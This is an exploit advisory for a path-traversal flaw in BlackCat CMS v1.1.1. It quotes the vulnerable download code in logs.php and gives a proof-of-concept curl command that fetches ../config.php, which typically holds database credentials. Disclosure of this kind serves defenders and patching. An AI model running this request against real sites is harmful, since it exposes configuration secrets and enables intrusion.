# Date: 2015/06/16
# Vendor Homepage: http://blackcat-cms.org/
# Software Link: http://blackcat-cms.org/temp/packetyzer/blackcatcms_2fo3PXdKj1.zip
# Version: v1.1.1
# Tested on: Centos 6.5,PHP 5.4.41
# Category: webapps

* Description

file:/modules/blackcat/widgets/logs.php

 72 // download
 73 if(CAT_Helper_Validate::sanitizeGet(&#039;dl&#039;))
 74 {
 75     $file = CAT_Helper_Directory::sanitizePath(CAT_PATH.&#039;/temp/&#039;.CAT_Helper_Validate::sanitizeGet(&#039;dl&#039;));  <-- Not Taint Checking
 76     if(file_exists($file))
 77     {
 78         $zip = CAT_Helper_Zip::getInstance(pathinfo($file,PATHINFO_DIRNAME).&#039;/&#039;.pathinfo($file,PATHINFO_FILENAME).&#039;.zip&#039;);
 79         $zip->config(&#039;removePath&#039;,pathinfo($file,PATHINFO_DIRNAME))
 80             ->create(array($file));
 81         if(!$zip->errorCode() == 0)
 82         {
 83             echo CAT_Helper_Validate::getInstance()->lang()->translate("Unable to pack the file")
 84                 . ": ".str_ireplace( array( str_replace(&#039;\\&#039;,&#039;/&#039;,CAT_PATH),&#039;\\&#039;), array(&#039;/abs/path/to&#039;,&#039;/&#039;), $file );
 85         }
 86         else
 87         {
 88             $filename = pathinfo($file,PATHINFO_DIRNAME).&#039;/&#039;.pathinfo($file,PATHINFO_FILENAME).&#039;.zip&#039;;
 89             header("Pragma: public"); // required
 90             header("Expires: 0");
 92             header("Cache-Control: private",false); // required for certain browsers
 93             header("Content-Type: application/zip");
 94             header("Content-Disposition: attachment; filename=\"".basename($filename)."\";" );
 95             header("Content-Transfer-Encoding: binary");
 96             header("Content-Length: ".filesize($filename));
 97             readfile("$filename");
 98             exit;
 99         }
100     }


POC:
curl -sH &#039;Accept-encoding: gzip&#039; "http://10.1.1.1/blackcat/modules/blackcat/widgets/logs.php?dl=../config.php" |gunzip -

